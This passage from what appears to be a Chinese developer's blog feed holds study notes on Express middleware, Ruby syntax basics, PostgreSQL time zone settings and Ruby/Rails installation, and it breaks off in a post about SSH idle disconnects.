id="express-的编程模型"><a href="#express-的编程模型" class="headerlink" title="express 的编程模型"></a>express 的编程模型</h2><h3 id="app-use"><a href="#app-use" class="headerlink" title="app.use()"></a>app.use()</h3><p><img src="/Blog/2020/09/02/node_js/Express%E6%A0%B8%E5%BF%83/index/img.png"></p><h3 id="中间件"><a href="#中间件" class="headerlink" title="中间件"></a>中间件</h3><ul><li>fn 就是中间件，因为他是被插入到启动和结束<strong>中间</strong>的物<strong>件</strong></li></ul><h4 id="优点"><a href="#优点" class="headerlink" title="优点"></a>优点</h4><h5 id="模块化"><a href="#模块化" class="headerlink" title="- 模块化"></a>- 模块化</h5><ul><li>这种模型使得每个功能都能通过一个函数实现</li><li>然后通过 app.use 将这个函数整合起来</li><li>如果把就函数放到文件或 npm 里，就实现了模块化</li></ul><h3 id="错误处理"><a href="#错误处理" class="headerlink" title="错误处理"></a>错误处理</h3><h4 id="next-error"><a href="#next-error" class="headerlink" title="- next(error)"></a>- next(error)</h4><ul><li>会直接进入 errorHandle，不执行后面的中间件</li></ul><h4 id="errorHandle-的默认实现见文档"><a href="#errorHandle-的默认实现见文档" class="headerlink" title="- errorHandle 的默认实现见文档"></a>- errorHandle 的默认实现见<a href="https://expressjs.com/en/guide/error-handling.html#the-default-error-handler">文档</a></h4><h4 id="自定义-errorHandle"><a href="#自定义-errorHandle" class="headerlink" title="- 自定义 errorHandle"></a>- 自定义 errorHandle</h4><ul><li>文档说一般放到最后定义</li><li>app.use((<strong>err</strong>, req, res, next) &#x3D;&gt; {})</li><li>可以定义多个这样的中间件</li></ul>]]></content>
      
      
      <categories>
          
          <category> Node.js </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Ruby 基础</title>
      <link href="/Blog/2020/08/29/rails/Ruby%E5%9F%BA%E7%A1%80/index/"/>
      <url>/Blog/2020/08/29/rails/Ruby%E5%9F%BA%E7%A1%80/index/</url>
      
        <content type="html"><![CDATA[<h1 id="Ruby-的基本概念"><a href="#Ruby-的基本概念" class="headerlink" title="Ruby 的基本概念"></a>Ruby 的基本概念</h1><h2 id="运行-ruby-的方式"><a href="#运行-ruby-的方式" class="headerlink" title="运行 ruby 的方式"></a>运行 ruby 的方式</h2><ul><li><strong>irb</strong></li><li>可交互命令行</li><li>你每次输入一个式子，他都会用 &#x3D;&gt; 给出一个值</li><li><strong>ruby</strong></li><li>ruby 加文件路径</li></ul><h2 id="变量"><a href="#变量" class="headerlink" title="变量"></a>变量</h2><ul><li><strong>没有关键字</strong><ul><li>没有 var、let、const，直接 a &#x3D; 1 就行</li></ul></li><li><strong>局部变量</strong><ul><li>小写字母开头</li><li>_开头</li></ul></li><li><strong>全局变量</strong><ul><li>$ 开头</li></ul></li><li><strong>类变量</strong><ul><li>@@ 开头</li></ul></li><li><strong>实例变量</strong><ul><li>@ 开头</li></ul></li></ul><h2 id="ruby-默认没有闭包"><a href="#ruby-默认没有闭包" class="headerlink" title="ruby 默认没有闭包"></a>ruby 默认没有闭包</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">a = <span class="number">1</span></span><br><span class="line">def f1</span><br><span class="line">   p a</span><br><span class="line">end</span><br><span class="line">f1() <span class="regexp">//</span> 括号可以省略</span><br><span class="line"><span class="regexp">//</span> 报错 ：a 不存在</span><br></pre></td></tr></table></figure><ul><li>闭包是指函数可以使用外部的自由变量</li><li>没有闭包是指函数 <strong>不可以</strong> 使用外部的自由变量</li><li>用 Ruby 其他语法也可以实现闭包</li></ul><h2 id="全局变量"><a href="#全局变量" class="headerlink" title="全局变量"></a>全局变量</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable">$a</span> = <span class="number">1</span></span><br><span class="line">def f1</span><br><span class="line">   p <span class="variable">$a</span></span><br><span class="line">end</span><br><span class="line">f1()</span><br><span class="line"><span class="regexp">//</span> <span class="number">1</span></span><br></pre></td></tr></table></figure><ul><li>加上 $ 就是全局变量</li></ul><h2 id="常量"><a href="#常量" class="headerlink" title="常量"></a>常量</h2><figure class="highlight scala"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">A</span> = <span class="number">1</span></span><br><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">f1</span></span></span><br><span class="line">   p <span class="type">A</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line">f1()</span><br><span class="line"><span class="comment">// 1</span></span><br></pre></td></tr></table></figure><ul><li>大写就是常量</li></ul><h2 id="多重赋值-JS叫做析构赋值"><a href="#多重赋值-JS叫做析构赋值" class="headerlink" title="多重赋值(JS叫做析构赋值)"></a>多重赋值(JS叫做析构赋值)</h2><ul><li><strong>简化</strong></li><li>a, b, c &#x3D; 1, 2, 3</li><li>a, b, *c &#x3D; 1, 2, 3, 4, 5</li><li>a, *b, c &#x3D; 1, 2, 3, 4, 5</li><li><strong>交换</strong></li><li>a, b &#x3D; b, a</li><li><strong>数组</strong></li><li>arr &#x3D; [1, 2]</li><li>a,b &#x3D; arr</li></ul><h2 id="字符串（有十几种）"><a href="#字符串（有十几种）" class="headerlink" title="字符串（有十几种）"></a>字符串（有十几种）</h2><ul><li><strong>单引号</strong></li><li>引号里面什么就是什么</li><li>puts ‘12\n34’</li><li>不会转义</li><li><strong>双引号</strong></li><li>puts “12\n34”</li><li>会把 \n 转义成换行</li><li><strong>多行字符串</strong></li><li>puts &lt;&lt;xxx（任意字符开头同样结尾，一般用 eos， endOfString）</li><li>12</li><li>34</li><li>xxx</li><li>如果有 \n ，会转义成换行</li></ul><h2 id="log"><a href="#log" class="headerlink" title="log"></a>log</h2><ul><li>*<em>打印数据</em></li><li>print(‘a’, ‘b’) - 默认不加换行</li><li>puts(‘a’, ‘b’) - 默认每个加换行</li><li>p ‘a’, ‘b’ - 加换行，不转义，且以人类理解的形式加标记</li><li>只要没有歧义，括号 () 都可以不写</li><li><strong>使用场景</strong></li><li>程序员一般使用 p</li><li>日志一般使用 puts 和 print</li></ul><h2 id="注释"><a href="#注释" class="headerlink" title="注释"></a>注释</h2><ul><li><strong>单行注释</strong></li><li><h1 id="这是单行注释"><a href="#这是单行注释" class="headerlink" title="这是单行注释"></a>这是单行注释</h1></li><li><h1 id="这是第二行注释"><a href="#这是第二行注释" class="headerlink" title="这是第二行注释"></a>这是第二行注释</h1></li><li><strong>多行注释</strong></li><li>&#x3D;begin</li><li>多行注释</li><li>&#x3D;end</li></ul><h1 id="Ruby-的控制语句"><a href="#Ruby-的控制语句" class="headerlink" title="Ruby 的控制语句"></a>Ruby 的控制语句</h1><h2 id="ruby-的-if-语句"><a href="#ruby-的-if-语句" class="headerlink" title="ruby 的 if 语句"></a>ruby 的 if 语句</h2><figure class="highlight livecodeserver"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">if</span> <span class="keyword">a</span>&gt;<span class="number">3</span> <span class="keyword">then</span> p <span class="string">&#x27;大&#x27;</span> <span class="keyword">end</span></span><br><span class="line"><span class="keyword">if</span> <span class="keyword">a</span>&gt;<span class="number">3</span> <span class="keyword">then</span> p <span class="string">&#x27;大&#x27;</span> <span class="keyword">else</span> p <span class="string">&#x27;小&#x27;</span> <span class="function"><span class="keyword">end</span></span></span><br><span class="line"><span class="function">// <span class="title">if</span> 是有返回值的，所以可以直接打印</span></span><br><span class="line">p(<span class="keyword">if</span> <span class="keyword">a</span>&gt;<span class="number">3</span> <span class="keyword">then</span> p <span class="string">&#x27;大&#x27;</span> <span class="keyword">else</span> p <span class="string">&#x27;小&#x27;</span> <span class="keyword">end</span>)</span><br><span class="line">p(<span class="keyword">if</span> <span class="keyword">a</span>&gt;<span class="number">4</span></span><br><span class="line">  <span class="string">&#x27;大&#x27;</span></span><br><span class="line">elseof <span class="keyword">a</span>&gt;<span class="number">2</span></span><br><span class="line">  <span class="string">&#x27;中&#x27;</span></span><br><span class="line"><span class="keyword">else</span></span><br><span class="line">  <span class="string">&#x27;小&#x27;</span></span><br><span class="line"><span class="keyword">end</span>)</span><br></pre></td></tr></table></figure><figure class="highlight xquery"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">b = <span class="keyword">if</span> a&gt;<span class="number">3</span> <span class="keyword">then</span> <span class="string">&#x27;big&#x27;</span> <span class="keyword">else</span> <span class="string">&#x27;small&#x27;</span> <span class="keyword">end</span></span><br><span class="line">b = a&gt;<span class="number">3</span> ? <span class="string">&#x27;big&#x27;</span> : <span class="string">&#x27;small&#x27;</span></span><br><span class="line"><span class="keyword">return</span> <span class="keyword">if</span><span class="built_in"> error</span> // 因为 <span class="keyword">if</span> 有返回值，所以可以这么简写，如果有<span class="built_in"> error</span> 就 <span class="keyword">return</span> 出去</span><br><span class="line"><span class="keyword">return</span> unless success // 另一种写法 // <span class="keyword">if</span><span class="built_in"> not</span> success</span><br></pre></td></tr></table></figure><h2 id="case-语句"><a href="#case-语句" class="headerlink" title="case 语句"></a>case 语句</h2><p>z &#x3D; case x<br>when 1<br>‘1’<br>when 1,2<br>‘2 or 3’<br>else<br>‘hi’<br>end</p><h1 id="Ruby-的循环"><a href="#Ruby-的循环" class="headerlink" title="Ruby 的循环"></a>Ruby 的循环</h1><h2 id="循环"><a href="#循环" class="headerlink" title="循环"></a>循环</h2><h3 id="times"><a href="#times" class="headerlink" title=".times"></a>.times</h3><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">7</span>.times <span class="keyword">do</span></span><br><span class="line">  p <span class="string">&#x27;一次&#x27;</span></span><br><span class="line">end</span><br><span class="line"><span class="number">7</span>.times &#123; p <span class="string">&#x27;一次&#x27;</span> &#125; <span class="regexp">//</span> 用花括号代替 <span class="keyword">do</span> end</span><br><span class="line"><span class="regexp">//</span> 等价于 [<span class="number">1</span>,<span class="number">2</span>,<span class="number">3</span>,<span class="number">4</span>,<span class="number">5</span>,<span class="number">6</span>,<span class="number">7</span>].map(v =&gt; console.log(v))</span><br></pre></td></tr></table></figure><h3 id="获取-i，和插值"><a href="#获取-i，和插值" class="headerlink" title="获取 i，和插值"></a>获取 i，和插值</h3><h3 id="i"><a href="#i" class="headerlink" title="|i|"></a>|i|</h3><figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line"><span class="number">7.</span>times <span class="built_in">do</span> |<span class="type">i</span>|</span><br><span class="line">  <span class="type">p</span> <span class="string">&quot;#&#123;i + 1&#125;次&quot;</span> // 注意要用双引号，不能用单引号</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="number">7.</span>times &#123; |<span class="type">i</span>|</span><br><span class="line">  <span class="type">p</span> <span class="string">&quot;#&#123;i + 1&#125;次&quot;</span></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><h2 id="each-（一般用于遍历数组）"><a href="#each-（一般用于遍历数组）" class="headerlink" title=".each （一般用于遍历数组）"></a>.each （一般用于遍历数组）</h2><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line"><span class="type">name</span> = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>]</span><br><span class="line">names.<span class="keyword">each</span> <span class="keyword">do</span> |<span class="type">name</span>|</span><br><span class="line">  p  <span class="type">name</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line">(<span class="number">1.</span><span class="number">.7</span>).<span class="keyword">each</span> <span class="keyword">do</span> |i| // 两个点构造类似数组的东西，其实他是一个 range（(<span class="number">1.</span><span class="number">.7</span>).<span class="keyword">class</span>）</span><br><span class="line">  p i</span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h2 id="for"><a href="#for" class="headerlink" title="for"></a>for</h2><figure class="highlight delphi"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">// 1 到 5</span></span><br><span class="line"><span class="keyword">for</span> i <span class="keyword">in</span> <span class="number">1</span>..<span class="number">5</span> <span class="keyword">do</span></span><br><span class="line">  p i</span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="comment">// 遍历数组</span></span><br><span class="line">names = [<span class="string">&#x27;a&#x27;</span>, <span class="string">&#x27;b&#x27;</span>]</span><br><span class="line"><span class="keyword">for</span> <span class="keyword">name</span> <span class="keyword">in</span> names</span><br><span class="line">  p <span class="keyword">name</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h2 id="while-x2F-until"><a href="#while-x2F-until" class="headerlink" title="while &#x2F; until"></a>while &#x2F; until</h2><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">i = <span class="number">1</span></span><br><span class="line"><span class="keyword">while</span> i&lt;<span class="number">3</span></span><br><span class="line">  p i</span><br><span class="line">  i+=<span class="number">1</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line"><span class="regexp">//</span> 和下面等价，与 <span class="keyword">if</span>，<span class="keyword">unless</span> 一对对应</span><br><span class="line">j =<span class="number">1</span></span><br><span class="line"><span class="keyword">until</span> j&gt;=<span class="number">3</span></span><br><span class="line">  p j</span><br><span class="line">  j+=<span class="number">1</span></span><br><span class="line"><span class="keyword">end</span></span><br></pre></td></tr></table></figure><h2 id="loop"><a href="#loop" class="headerlink" title="loop"></a>loop</h2><figure class="highlight awk"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">loop <span class="keyword">do</span></span><br><span class="line">  p <span class="string">&#x27;ruby&#x27;</span></span><br><span class="line">end</span><br><span class="line"><span class="regexp">//</span> 上面代码会一直无线循环，除非在里面写 <span class="keyword">break</span></span><br></pre></td></tr></table></figure><h2 id="跳出循环"><a href="#跳出循环" class="headerlink" title="跳出循环"></a>跳出循环</h2><ul><li>break 表示退出所有循环</li><li>next 表示退出当前循环，进入下一次循环</li><li>对应 JS 里的 break 和 continue</li></ul><h1 id="Ruby-中的数据类型"><a href="#Ruby-中的数据类型" class="headerlink" title="Ruby 中的数据类型"></a>Ruby 中的数据类型</h1><ul><li><strong>只有对象，可用 .class 查看类</strong></li><li>不像 JS 有基本类型，ruby 中的数字 1 也是对象（所以 7.time 可以运行）</li><li>整数 - Intrger 对象 &#x2F; Numeric 对象</li><li>浮点数 - Float 对象</li><li>字符串对象 - String 对象</li><li>数组 - Array 对象</li><li>正则表达式 - Regexp 对象</li><li>时间 - Time 对象</li><li>文件 - File 对象</li><li>符号 - Symbol 对象</li><li>异常 - Exception 对象</li><li>散列 - Hash 对象</li><li><strong>标识</strong>：每一个对象都有一个 object_id 属性，表示其唯一性（[1,2] &#x3D;&#x3D; [1,2] &#x2F;&#x2F; true）</li></ul><h1 id="Ruby-的数组和散列"><a href="#Ruby-的数组和散列" class="headerlink" title="Ruby 的数组和散列"></a>Ruby 的数组和散列</h1><h2 id="Ruby-数组"><a href="#Ruby-数组" class="headerlink" title="Ruby 数组"></a>Ruby 数组</h2><ul><li>arr &#x3D; [1, 2, 3]</li><li>arr.size &#x2F;&#x2F; 5</li><li>arr.methods &#x2F;&#x2F; 打印出所有的方法，如 pop &#x2F; shift &#x2F; push &#x2F; append &#x2F; find &#x2F; find_all &#x2F; each &#x2F; each_with_index … 注意这些方法前面都有一个冒号，这是 symbol</li></ul><h2 id="Ruby-散列"><a href="#Ruby-散列" class="headerlink" title="Ruby 散列"></a>Ruby 散列</h2><ul><li><em>创建一个散列</em>*</li><li>person &#x3D; {name: ‘zch’, age: 18}</li><li><strong>symbol</strong></li><li>上面的 name 和 age 不是字符串，而是 symbol</li><li>person.keys &#x2F;&#x2F; [:name, :age]</li><li>打印 person 发现为 person &#x3D; {:name &#x3D;&gt; ‘zch’, :age &#x3D;&gt; 18}，所以也可以这样声明上面的person（古老的时候都是这么声明的）</li><li><strong>注意</strong>不要使用 <code>person.sex = &#39;男&#39;</code> 来添加属性，因为在 ruby 中所有的 <code>.</code> 后面都是方法，上面会被理解成调用 person 的 sex 方法！</li><li><strong>注意</strong>可以把 symbol 理解为轻量的字符串，功能更少（打印出 <code>&#39;name&#39;.methods</code> 和 <code>:name.methods</code> 即可发现），他把其他字符串其他作为 key 没用的方法都删了，所以作为key一般都使用 symbol</li><li><strong>可以互相转换</strong> :name.to_s 得到字符串，’name’.to_sym 的到符号</li></ul><h2 id="遍历散列"><a href="#遍历散列" class="headerlink" title="遍历散列"></a>遍历散列</h2><h3 id="each"><a href="#each" class="headerlink" title=".each"></a>.each</h3><ul><li>和数组方法一致，但是多了一个参数<figure class="highlight coq"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">person.each <span class="built_in">do</span> |<span class="type">key</span>, value|</span><br><span class="line">  <span class="type">p</span> <span class="string">&quot;key: #&#123;key&#125;,value:#&#123;value&#125;&quot;</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line">// 输出时，symbol 会自动变为 string</span><br></pre></td></tr></table></figure></li></ul><h1 id="与-JS-的区别1"><a href="#与-JS-的区别1" class="headerlink" title="与 JS 的区别1"></a>与 JS 的区别1</h1><ul><li>person &#x3D; {name: ‘zch’, age: 18}</li><li>如果你想获取 ‘zch’</li><li><strong>不能用 person.name</strong></li><li>必须用 person[:name]</li><li><strong>不能用 person[‘name’]</strong></li><li>必须用 person[:name]</li><li><em>‘name’ 和 :name 是不同的</em></li><li>person[‘name’] &#x3D; ‘jack’</li><li>person.keys &#x3D;&gt; [:name, :age, ‘name’]</li></ul><h1 id="与-JS-的区别2"><a href="#与-JS-的区别2" class="headerlink" title="与 JS 的区别2"></a>与 JS 的区别2</h1><figure class="highlight elixir"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">def</span> <span class="title">say_hi</span></span></span><br><span class="line">  p <span class="string">&#x27;hi&#x27;</span></span><br><span class="line"><span class="keyword">end</span></span><br><span class="line">person = &#123;<span class="symbol">name:</span> <span class="string">&#x27;zch&#x27;</span>, <span class="symbol">age:</span> <span class="number">18</span>&#125;</span><br></pre></td></tr></table></figure><ul><li>如果想要给 person 加一个方法 &#x2F; 函数</li><li><strong>不能用 person[:say_hi] &#x3D; say_hi</strong></li><li>因为 say_hi 等价于 say_hi()</li><li>say_hi 的返回值为 p ‘hi’ 的返回值，也就是 ‘hi’</li><li>所以相当于 person[:say_hi] &#x3D; ‘hi’</li><li><strong>可以使用 lambda 表达式做到</strong></li><li>person[:say_hi] &#x3D; lambda {p ‘hi’}</li><li>person[:say_hi].call &#x2F;&#x2F; ‘hi’</li></ul><p>练习：<br><a href="https://github.com/zch233/ruby-demo1">https://github.com/zch233/ruby-demo1</a><br>参考：<br><a href="https://www.runoob.com/ruby/ruby-tutorial.html">https://www.runoob.com/ruby/ruby-tutorial.html</a><br><a href="https://devdocs.io/ruby~2.6/">https://devdocs.io/ruby~2.6&#x2F;</a><br><a href="https://apidock.com/ruby/search?query=array&commit=Search">https://apidock.com/ruby/search?query=array&commit=Search</a></p>]]></content>
      
      
      <categories>
          
          <category> Rails </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Postgresql设置时区</title>
      <link href="/Blog/2020/08/26/javascript/Postgresql%E8%AE%BE%E7%BD%AE%E6%97%B6%E5%8C%BA/index/"/>
      <url>/Blog/2020/08/26/javascript/Postgresql%E8%AE%BE%E7%BD%AE%E6%97%B6%E5%8C%BA/index/</url>
      
        <content type="html"><![CDATA[<h2 id="1-查看时区"><a href="#1-查看时区" class="headerlink" title="1. 查看时区"></a>1. 查看时区</h2><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">show</span> <span class="type">time</span> <span class="type">zone</span>;</span><br></pre></td></tr></table></figure><h2 id="2-查看时间"><a href="#2-查看时间" class="headerlink" title="2. 查看时间"></a>2. 查看时间</h2><figure class="highlight csharp"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">select</span> <span class="title">now</span>()</span>;</span><br></pre></td></tr></table></figure><h2 id="3-查看支持的时区列表"><a href="#3-查看支持的时区列表" class="headerlink" title="3. 查看支持的时区列表"></a>3. 查看支持的时区列表</h2><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">select</span> * <span class="keyword">from</span> pg_timezone_names;</span><br></pre></td></tr></table></figure><h2 id="4-设置成东八区-北京时间-UTC-8"><a href="#4-设置成东八区-北京时间-UTC-8" class="headerlink" title="4.设置成东八区 北京时间 UTC+8"></a>4.设置成东八区 北京时间 UTC+8</h2><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">set</span> <span class="type">time</span> <span class="type">zone</span> <span class="string">&#x27;PRC&#x27;</span>;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> javascript </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>安装 Ruby &amp; Rails</title>
      <link href="/Blog/2020/08/22/rails/%E5%AE%89%E8%A3%85Ruby&amp;Rails/index/"/>
      <url>/Blog/2020/08/22/rails/%E5%AE%89%E8%A3%85Ruby&amp;Rails/index/</url>
      
        <content type="html"><![CDATA[<h1 id="Windows"><a href="#Windows" class="headerlink" title="Windows"></a>Windows</h1><h2 id="命令行（可用可不用）"><a href="#命令行（可用可不用）" class="headerlink" title="命令行（可用可不用）"></a>命令行（可用可不用）</h2><ul><li>如果有 Git Bash 就卸载 Git Bash</li><li>安装 <a href="https://cmder.net/">Cmder</a> 代替 Git Bash</li><li>得到 C:\Software\cmder\Cmder.exe （不要有空格和中文）</li><li>新的 Git Bash 位于在 D:\Software\cmder\vendor\git-for-windows\bin\bash.exe</li><li>就因为 Cmder 自带 Git Bash，为了避免在使用 Git Bash 的时候不知道用的哪个 Git Bash，所以要卸载原有的 Git Bash</li><li>将 Cmder 的默认启动改为 bash:bash</li><li>将 Cmder 设置为一键呼出（比如 Alt+F1 或 Alt+1）</li><li>将 ComEmu.xml 里加一句 <code>&lt;value name=&quot;Language&quot; type=&quot;string&quot; data=&quot;zh&quot;/&gt;</code> 可以得到完整的汉化版本</li></ul><p><img src="/Blog/2020/08/22/rails/%E5%AE%89%E8%A3%85Ruby&Rails/index/img.png" alt="最终截图"></p><h2 id="Ruby-amp-Rails"><a href="#Ruby-amp-Rails" class="headerlink" title="Ruby &amp; Rails"></a>Ruby &amp; Rails</h2><ul><li>下载 <a href="https://rubyinstaller.org/downloads/">Ruby Installer</a> 最新版（带 Devkit 的版本，否则本地不能编译）</li><li>安装到 C:\Ruby\Ruby26-x64 目录，一直点下一步</li><li>安装完会出现一个黑框，选择默认值然后回车即可</li><li>确保 C:\Ruby\Ruby26-x64\bin 在 PATH 环境变量里</li><li>确保 ruby -v 得到版本号</li><li>确保 gem -v 得到版本号（类似于 npm 的包管理器）</li><li>确保 irb -v 得到版本号</li><li>按<a href="https://gems.ruby-china.com/">教程</a>设置 Ruby 中国源或者把官方加入 Proxifier</li><li>运行 gem update –system –verbose</li><li>安装 Rails 6：<code>gem install rails -v 6 --verbose</code></li></ul><h3 id="设置-Ruby-路径"><a href="#设置-Ruby-路径" class="headerlink" title="设置 Ruby 路径"></a>设置 Ruby 路径</h3><p><img src="/Blog/2020/08/22/rails/%E5%AE%89%E8%A3%85Ruby&Rails/index/img_1.png"></p><h3 id="RubyMine-多本版-ruby"><a href="#RubyMine-多本版-ruby" class="headerlink" title="RubyMine 多本版 ruby"></a>RubyMine 多本版 ruby</h3><ul><li>直接在 Ruby SDK and Gems 里切换</li></ul><h3 id="命令行多版本-ruby"><a href="#命令行多版本-ruby" class="headerlink" title="命令行多版本 ruby"></a>命令行多版本 ruby</h3><ul><li>运行 touch ~&#x2F;.bashrc</li><li>如果有 Ruby 2.6 就在 ~&#x2F;.bashrc 里添加一行 <code> alias ruby26=&quot;export PATH=&#39;/c/Ruby/Ruby26-x64/bin:$PATH&#39;&quot;</code></li><li>如果有 Ruby 2.5 就在 ~&#x2F;.bashrc 里添加一行 <code> alias ruby25=&quot;export PATH=&#39;/c/Ruby/Ruby25-x64/bin:$PATH&#39;&quot;</code></li><li>ruby26 可切换到版本，ruby25 可切换到 2.5 版本</li></ul><h1 id="MacOS"><a href="#MacOS" class="headerlink" title="MacOS"></a>MacOS</h1><h2 id="Homebrew"><a href="#Homebrew" class="headerlink" title="Homebrew"></a>Homebrew</h2><ul><li>进入 <a href="https://brew.sh/index_zh-cn">https://brew.sh/index_zh-cn</a></li><li>运行网站的第一行命令</li><li>按照 <a href="https://mirrors.ustc.edu.cn/help/brew.git.html">教程</a> 设置 brew 镜像</li></ul><p><img src="/Blog/2020/08/22/rails/%E5%AE%89%E8%A3%85Ruby&Rails/index/img_2.png" alt="注意：这里也要看"></p><h2 id="Ruby-amp-Rails-1"><a href="#Ruby-amp-Rails-1" class="headerlink" title="Ruby &amp; Rails"></a>Ruby &amp; Rails</h2><ul><li>进入 <a href="https://rvm.io/">https://rvm.io/</a></li><li>运行网站的前两行命令</li><li>第一条命令 gpg2 开头， 如果出错就改为 <code>gpg --keyserver hkp://pool.sks-keyservers.net --recv-keys 409B6B1796C275462A1703113804BB82D39DC0E3 7D2BAF1CF37B13E2069D6956105BD0E739499BDB</code></li><li>相关安装命令 <code>brew install gpg2</code></li><li>按照 <a href="https://ruby-china.org/wiki/rvm-guide">教程</a> 设置 Ruby 2.6</li><li>按照 <a href="https://gems.ruby-china.com/">教程</a> 设置 Ruby 中国源</li><li>运行 <code>gem update --system --verbose</code></li><li>安装 Rails 6：<code>gem install rails -v 6 --verbose</code></li></ul>]]></content>
      
      
      <categories>
          
          <category> Rails </category>
          
      </categories>
      
      
    </entry>
    
    
    
    <entry>
      <title>Linux使用ssh超时断开连接的真正原因</title>
      <link href="/Blog/2020/08/08/essay/Linux%E4%BD%BF%E7%94%A8ssh%E8%B6%85%E6%97%B6%E6%96%AD%E5%BC%80%E8%BF%9E%E6%8E%A5%E7%9A%84%E7%9C%9F%E6%AD%A3%E5%8E%9F%E5%9B%A0/index/"/>
      <url>/Blog/2020/08/08/essay/Linux%E4%BD%BF%E7%94%A8ssh%E8%B6%85%E6%97%B6%E6%96%AD%E5%BC%80%E8%BF%9E%E6%8E%A5%E7%9A%84%E7%9C%9F%E6%AD%A3%E5%8E%9F%E5%9B%A0/index/</url>
      
        <content type="html"><![CDATA[<blockquote><p>最近使用 ssh 连接服务器的时候，经常一段时间没有操作就断开了（即无法正常操作，键盘输入无反应），一直以为这是服务器的保护措施，直到一次用公司电脑连接的时候，并没有出现这种问题，于是陷入了沉思…..</p></blockquote><h2 id="1-提问"><a href="#1-提问" class="headerlink" title="1.提问"></a>1.提问</h2><p>提个问题：如果按照原来的想法，既然ssh是空闲过久导致连接超时而断开，那么<code>「ssh默认是多久时间，会自动断开连接？」</code></p><p>结果翻遍大半个搜索引擎……全都是诸如<code>「如何设置，才能让ssh不超时自动断」</code>这样的鬼title，而且大部分都是互相抄，复制粘贴的内容……而我想问的问题是<code>「到底多久超时」</code>，却没人说过……或者说，其实跟本没有ssh超时这一说？！</p><p>再提个问题：如果ssh默认设置都没有限制，那<code>「为什么ssh会断开连接？」</code></p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">vim /etc/ssh/sshd_config</span><br></pre></td></tr></table></figure><figure class="highlight 1c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line"><span class="meta"># ...</span></span><br><span class="line"><span class="meta">#ClientAliveInterval 0</span></span><br><span class="line"><span class="meta">#ClientAliveCountMax 3</span></span><br><span class="line"><span class="meta"># 